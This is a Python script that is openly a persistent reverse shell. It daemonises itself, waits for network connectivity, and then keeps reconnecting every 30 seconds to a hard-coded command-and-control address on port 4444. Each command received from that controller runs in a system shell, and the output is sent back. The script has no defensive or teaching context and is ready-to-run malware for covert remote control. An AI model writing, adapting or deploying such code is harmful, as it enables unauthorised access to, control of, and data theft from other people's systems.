#!/usr/bin/env python3
"""
REBOOT-SURVIVAL Reverse Shell
Waits for network and auto-reconnects after reboot
"""

import socket
import subprocess
import os
import time
import sys

class RebootSurvivalShell:
    def __init__(self):
        self.C2_IP = "192.168.1.167"
        self.C2_PORT = 4444
        self.current_dir = os.getcwd()
        
    def wait_for_network_after_reboot(self):
        """Wait for network connectivity after system reboot"""
        print("[+] Waiting for network after reboot...")
        for i in range(60):  # Wait up to 60 seconds
            try:
                # Test internet connectivity
                socket.create_connection(("8.8.8.8", 53), timeout=10)
                print("[✅] Network is ready after reboot")
                return True
            except:
                if i % 10 == 0:
                    print(f"[⏳] Waiting for network... {i}/60 seconds")
                time.sleep(1)
        print("[⚠️] Network timeout, continuing anyway...")
        return True
    
    def become_daemon(self):
        """Run as background daemon"""
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except OSError as e:
            sys.exit(1)
        
        os.chdir("/")
        os.setsid()
        os.umask(0)
        
    def reconnect_after_reboot(self):
        """Reconnect logic that survives reboots"""
        # Wait for network after reboot
        self.wait_for_network_after_reboot()
        
        while True:
            try:
                print(f"[🔄] Attempting connection to {self.C2_IP}:{self.C2_PORT}")
                
                s = socket.socket()
                s.settimeout(30)
                s.connect((self.C2_IP, self.C2_PORT))
                
                print("[✅] SUCCESS: Reconnected after reboot!")
                s.send(b"REBOOT_SURVIVED: Shell reconnected successfully!\n")
                
                # Main command loop
                while True:
                    data = s.recv(1024).decode().strip()
                    if not data:
                        continue
                        
                    if data.lower() == 'exit':
                        break
                    
                    # Execute command
                    try:
                        result = subprocess.run(data, shell=True, capture_output=True, text=True)
                        output = result.stdout + result.stderr
                    except Exception as e:
                        output = f"Error: {str(e)}"
                    
                    s.send(output.encode())
                    
            except ConnectionRefusedError:
                print("[❌] C2 offline, retrying in 30s...")
            except Exception as e:
                print(f"[❌] Connection error: {e}")
            
            time.sleep(30)  # Retry every 30 seconds

    def start(self):
        """Start the reboot-survival shell"""
        self.become_daemon()
        self.reconnect_after_reboot()

if __name__ == "__main__":
    RebootSurvivalShell().start()
